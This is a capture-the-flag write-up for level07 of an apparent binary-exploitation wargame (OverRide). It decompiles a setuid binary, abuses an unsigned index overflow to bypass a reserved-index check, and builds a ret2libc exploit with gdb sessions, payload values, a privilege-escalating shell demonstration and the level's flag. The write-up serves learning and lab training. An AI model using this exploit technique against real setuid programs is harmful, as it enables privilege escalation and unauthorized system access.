

# level07

## General Informations 

**Path** : `/home/users/level07/level07` </br>
**File** : 
```
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf5b46cdb878d5a3929cc27efbda825294de5661e, not stripped
```
**Permissions**: `-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07`  </br>
**Protections**:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   level07
```

## Static Analysis

After decompiling the binary in ghidra, we get the pseudo code below: 

```
undefined4 get_unum(void)
{
  undefined4 local_10 [3];
  
  local_10[0] = 0;
  fflush(stdout);
  __isoc99_scanf("%u",local_10);
  clear_stdin();
  return local_10[0];
}

undefined4 read_number(int param_1)
{
  int index;
  
  printf(" Index: ");
  index = get_unum();
  printf(" Number at data[%u] is %u\n",index,*(undefined4 *)(index * 4 + param_1));
  return 0;
}


undefined4 store_number(int param_1)
{
  uint number;
  uint index;
  undefined4 ret_val;
  
  printf(" Number: ");
  number = get_unum();
  printf(" Index: ");
  index = get_unum();
  if ((index % 3 == 0) || (number >> 0x18 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    ret_val = 1;
  }
  else {
    *(uint *)(index * 4 + param_1) = number;
    ret_val = 0;
  }
  return ret_val;
}

undefined4 main(undefined4 param_1,int *param_2,int *param_3)
{
  char cVar1;
  byte bVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  char *pcVar7;
  byte *pbVar8;
  int in_GS_OFFSET;
  bool bVar9;
  bool bVar10;
  bool bVar11;
  byte bVar12;
  int *local_1c8;
  int *local_1c4;
  undefined4 buffer [100];
  undefined4 ret_value;
  byte command [20];
  int local_14;
  
  bVar12 = 0;
  local_1c4 = param_2;
  local_1c8 = param_3;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  ret_value = 0;
  memset(&command, 0, 20);
  memset(&buffer, 0, 100);
  for (; *local_1c4 != 0; local_1c4 = local_1c4 + 1) {
    uVar4 = 0xffffffff;
    pcVar7 = (char *)*local_1c4;
    do {
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      cVar1 = *pcVar7;
      pcVar7 = pcVar7 + (uint)bVar12 * -2 + 1;
    } while (cVar1 != '\0');
    memset((void *)*local_1c4,0,~uVar4 - 1);
  }
  for (; *local_1c8 != 0; local_1c8 = local_1c8 + 1) {
    uVar4 = 0xffffffff;
    pcVar7 = (char *)*local_1c8;
    do {
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      cVar1 = *pcVar7;
      pcVar7 = pcVar7 + (uint)bVar12 * -2 + 1;
    } while (cVar1 != '\0');
    memset((void *)*local_1c8,0,~uVar4 - 1);
  }
  puts(
      "----------------------------------------------------\n  Welcome to wil\'s crappy number stora ge service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------------------------\n"
      );
  do {
    printf("Input command: ");
    ret_value = 1;
    fgets((char *)command,0x14,stdin);
    uVar4 = strlen(command) 
    bVar9 = uVar4 == 1;
    bVar11 = uVar4 == 2;
    *(undefined1 *)((int)&ret_value + uVar4 + 2) = 0;
    iVar3 = 5;
    pbVar5 = command;
    pbVar8 = (byte *)"store";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      bVar9 = *pbVar5 < *pbVar8;
      bVar11 = *pbVar5 == *pbVar8;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
    } while (bVar11);
    bVar10 = false;
    bVar9 = (!bVar9 && !bVar11) == bVar9;
    if (bVar9) {
      ret_value = store_number(buffer);
    }
    else {
      iVar3 = 4;
      pbVar5 = command;
      pbVar8 = &DAT_08048d61; # 'read' command
      do {
        if (iVar3 == 0) break;
        iVar3 = iVar3 + -1;
        bVar10 = *pbVar5 < *pbVar8;
        bVar9 = *pbVar5 == *pbVar8;
        pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
        pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
      } while (bVar9);
      bVar11 = false;
      bVar9 = (!bVar10 && !bVar9) == bVar10;
      if (bVar9) {
        ret_value = read_number(buffer);
      }
      else {
        iVar3 = 4;
        pbVar5 = command;
        pbVar8 = &DAT_08048d66; # 'quit' command
        do {
          if (iVar3 == 0) break;
          iVar3 = iVar3 + -1;
          bVar11 = *pbVar5 < *pbVar8;
          bVar9 = *pbVar5 == *pbVar8;
          pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
          pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
        } while (bVar9);
        if ((!bVar11 && !bVar9) == bVar11) {
          if (local_14 == *(int *)(in_GS_OFFSET + 0x14)) {
            return 0;
          }
          __stack_chk_fail();
        }
      }
    }
    if (ret_value == 0) {
      printf(" Completed %s command successfully\n",command);
    }
    else {
      printf(" Failed to do %s command\n",command);
    }
    memset(&command, 0, 20);
  } while( true );
}
```

- `get_unum`, asks for a usingend number and return it
- `read_number`, asks for an `index` and read the value stored at `buffer + (index * 4)`
- `store_number`:
    - Asks for an `index` and a `number` 
    - If the `index` is not a multiple of 3 and the first byte isn't equals to 183 (`number >> 0x18 == 0xb7`), then the `number` is written at the location `index * 4 + param_1`
- `main`:
    - Infinite loop 
    - Asking to execute 3 commands: `read`, `store` and `quit`


## Vulnerability found  

The vulnerability lies in the code. We can overflow the unsigned int `index` and overwrite the return address of main.   

## Dynamic Analysis

First we put a breakpoint at the `fgets` call: 
```
(gdb) b *0x08048882
Breakpoint 1 at 0x8048882
(gdb) c
...
 Number: 1
 Index: 1
...
(gdb) x/50x $esp 
0xffffd430:	0xffffd5e8	0x00000014	0xf7fcfac0	0xf7fdc714
0xffffd440:	0x00000098	0xffffffff	0xffffd730	0xffffd6b8
0xffffd450:	0x00000000	0x00000000	0x00000001	0x00000000
```
The buffer starts at `0xffffd454`.

The return address of main is located at `0xffffd61c`:
```
(gdb) x $ebp + 4
0xffffd61c:	0xf7e45513
```

We have a difference of 456 bytes from the start of the buffer and the return address of main:
```
(gdb) p/u 0xffffd61c - 0xffffd454
$12 = 456
```

Let's divide 456 by 4 to know the index to write in the return address of main `456 / 4 = 114`, the index is 114: 
```
(gdb) c
Continuing.
Input command: store
 Number: 65
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

Ok. We can't write on this address with this index. </br>
The `index` is actually an usigned int multiplied by 4, wich is vulnerable to overflow. We want to have `buffer + 456`, `(4294967296 + 456) / 4 = 4294967752 / 4 = 1073741938`.

Let's try it:
```
(gdb) c
...
 Number: 5
 Index: 1073741938
(gdb) c
...
Program received signal SIGSEGV, Segmentation fault.
0x00000005 in ?? ()
```

It works, we finally overwritted it ! Now we will use the **ret2libc** technique to execute our shell:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p/d 0xf7e6aed0
$3 = 4159090384
(gdb) find &system,+99999999,"/bin/sh"
0xf7f897ec
(gdb) p/d 0xf7f897ec
$4 = 4160264172
```

We write the address of `system` at the index `1073741938` and then `/bin/sh` at the index 116: (the address at index 115 is considered as the return address for `system`)
```
(gdb) c
Continuing.
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully

Breakpoint 1, 0x08048882 in main ()
(gdb) c
Continuing.
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully

Breakpoint 1, 0x08048882 in main ()
(gdb) c
Continuing.
Input command: quit
$ whoami
level07
```

The shell is correctly executed !

## Payload construction 

We convert the address of `system` in an unsigned int, and overflow the index to write at `buffer + 456`:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p/d 0xf7e6aed0
$3 = 4159090384
...
 Number: 4159090384
 Index: 1073741938
```

We convert the address of `/bin/sh` in an usigned int too and write on the index 116 (the address at 115 is considered as the return address for `system`):
```
(gdb) find &system,+99999999,"/bin/sh"
0xf7f897ec
(gdb) p/d 0xf7f897ec
$4 = 4160264172
...
 Number: 4160264172
 Index: 116
```

## Demonstration 

```
level07@OverRide:~$ ./level07 
...
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```

## Flag 
```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```